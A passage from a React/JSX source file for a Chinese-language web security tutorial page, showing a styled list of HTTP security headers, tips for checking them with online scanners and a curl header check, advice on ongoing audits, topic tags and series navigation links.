                    desc: '禁止頁面使用特定瀏覽器 API，例如攝影機、麥克風、地理位置。',
                    level: 'low',
                  },
                ].map(({ header, value, desc, level }) => {
                  const colors = {
                    critical: { bg: 'bg-red-50', border: 'border-red-200', badge: 'bg-red-600', label: '必須' },
                    high: { bg: 'bg-orange-50', border: 'border-orange-200', badge: 'bg-orange-600', label: '重要' },
                    medium: { bg: 'bg-yellow-50', border: 'border-yellow-200', badge: 'bg-yellow-600', label: '建議' },
                    low: { bg: 'bg-green-50', border: 'border-green-200', badge: 'bg-green-600', label: '選用' },
                  }[level];

                  return (
                    <div key={header} className={`p-4 ${colors.bg} rounded-lg border ${colors.border}`}>
                      <div className="flex items-start justify-between gap-3 mb-2">
                        <code className="font-mono text-sm font-bold text-gray-800">{header}</code>
                        <span className={`${colors.badge} text-white text-xs px-2 py-0.5 rounded-full shrink-0`}>{colors.label}</span>
                      </div>
                      <code className="text-xs text-gray-500 block mb-2 font-mono">{value}</code>
                      <p className="text-gray-600 text-xs leading-relaxed">{desc}</p>
                    </div>
                  );
                })}
              </div>

              <CodeBlock language="typescript">
{` // 驗證你的網站安全標頭：
// 1. securityheaders.com — 輸入你的網址，直接評分
// 2. Mozilla Observatory — observatory.mozilla.org
// 3. curl 命令檢查：
//    curl -I https://yoursite.com | grep -i 'content-security\|x-frame\|strict-transport'

// 加上 helmet() 後，你的 Express 應用可以達到：
// securityheaders.com 評分：A 或 A+
// Mozilla Observatory 評分：A+
// 這已經超越大多數商業網站的安全配置 `}
</CodeBlock>

              <div className="mt-6 p-5 bg-gradient-to-r from-red-900/10 to-rose-800/10 rounded-xl border border-red-200">
                <div className="flex items-start gap-3">
                  <Lock className="text-red-600 shrink-0 mt-0.5" size={20} />
                  <div>
                    <p className="font-bold text-gray-800 mb-1">安全是持續的過程，不是一次性設定</p>
                    <p className="text-gray-600 text-sm leading-relaxed">
                      只要加上 <code className="bg-gray-100 px-1.5 py-0.5 rounded">helmet()</code>，你的 Express 應用立刻達到業界標準安全配置。但安全不是一次設定就永遠安全 — 需要持續關注 npm audit 的安全警告、依賴套件的更新、以及業務邏輯中新增的漏洞。定期進行安全審計（Security Audit）和滲透測試，是成熟工程團隊的標準實踐。
                    </p>
                  </div>
                </div>
              </div>
            </CardBody>
          </Card>
        </motion.div>

        <Divider className="my-8" />

        {/* ── Tags ───────────────────────────────────────────── */}
        <motion.div {...fadeInUp}>
          <div className="flex flex-wrap gap-2">
            {['XSS', 'CSRF', 'CSP', 'Web Security', 'OWASP', 'SQL Injection', 'Helmet'].map((tag) => (
              <Chip
                key={tag}
                variant="flat"
                className="bg-rose-100 text-rose-700 font-medium"
              >
                {tag}
              </Chip>
            ))}
          </div>
        </motion.div>

        {/* ── Navigation ─────────────────────────────────────── */}
        <motion.div {...fadeInUp}>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <Link href="/blog/web-dev/ep29-accessibility">
              <Card className="shadow hover:shadow-md transition-shadow cursor-pointer border border-gray-200 hover:border-rose-300">
                <CardBody className="p-5">
                  <div className="flex items-center gap-3">
                    <ArrowLeft className="text-rose-500 shrink-0" size={20} />
                    <div>
                      <p className="text-xs text-gray-400 mb-0.5">上一篇</p>
                      <p className="font-semibold text-gray-700 text-sm">EP.29 無障礙設計</p>
                      <p className="text-xs text-gray-400">ARIA、語義化 HTML、鍵盤導航</p>
                    </div>
                  </div>
                </CardBody>
              </Card>
            </Link>
            <Link href="/blog/web-dev/ep01-modern-web">
              <Card className="shadow hover:shadow-md transition-shadow cursor-pointer border border-gray-200 hover:border-rose-300">
                <CardBody className="p-5">
                  <div className="flex items-center justify-between gap-3">
                    <div className="text-right">
                      <p className="text-xs text-gray-400 mb-0.5">下一篇</p>
                      <p className="font-semibold text-gray-700 text-sm">EP.01 現代網頁開發</p>
                      <p className="text-xs text-gray-400">系列起點，重新出發</p>
                    </div>
                    <ArrowRight className="text-rose-500 shrink-0" size={20} />
                  </div>
                </CardBody>
              </Card>
            </Link>
          </div>
        </motion.div>

      </div>
    </div>
  );
}
